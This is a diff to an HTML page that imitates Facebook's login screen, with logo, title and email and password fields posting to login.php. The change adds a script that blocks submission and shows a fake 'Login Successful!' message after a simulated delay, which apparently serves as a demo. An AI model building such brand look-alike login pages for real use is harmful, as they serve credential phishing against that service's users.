@@ -8,10 +8,10 @@
 </head>
 <body>
     <div class="login-container">
-        <div class="login-box">
+        <div class="login-box" id="loginBox">
             <img src="facebook_logo.png" alt="Facebook Logo" class="logo">
             <h2 class="title">Log into Facebook</h2>
-            <form action="login.php" method="POST" class="login-form">
+            <form action="login.php" method="POST" class="login-form" id="loginForm">
                 <input type="text" name="email" placeholder="Email or Phone Number" class="input-field" required>
                 <input type="password" name="password" placeholder="Password" class="input-field" required>
                 <button type="submit" class="login-button">Log In</button>
@@ -20,6 +20,35 @@
             <hr class="separator">
             <button class="create-account-button">Create New Account</button>
         </div>
+
+        <!-- Success message container -->
+        <div class="success-message" id="successMessage">
+            <h2 class="title">Login Successful!</h2>
+            <p>Welcome back, [User Name]!</p>
+        </div>
     </div>
+
+    <script>
+        // Hide success message initially
+        document.getElementById('successMessage').style.display = 'none';
+
+        // Function to handle successful login display
+        function showSuccessMessage() {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+        }
+
+        // Simulate successful login (for demonstration purposes)
+        // Replace this with actual login success handling in your application
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form submission for demo
+
+            // Simulate login success
+            // Replace with actual login logic
+            setTimeout(function() {
+                showSuccessMessage();
+            }, 1500); // Show success message after 1.5 seconds (simulating server response delay)
+        });
+    </script>
 </body>
 </html>
